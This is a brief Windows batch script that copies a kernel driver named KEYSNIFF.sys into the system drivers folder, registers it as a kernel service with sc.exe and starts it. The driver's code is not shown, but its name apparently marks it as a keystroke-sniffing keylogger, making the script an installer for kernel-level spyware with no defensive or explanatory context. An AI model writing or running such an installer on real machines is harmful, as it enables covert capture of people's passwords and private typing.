setlocal
del %windir%\System32\drivers\KEYSNIFF.sys
copy i386\KEYSNIFF.sys %windir%\System32\drivers\KEYSNIFF.sys
sc.exe create KEYSNIFF binpath= %windir%\System32\drivers\KEYSNIFF.sys type= kernel start= demand error= normal DisplayName= KEYSNIFFBla
sc.exe start KEYSNIFF
endlocal
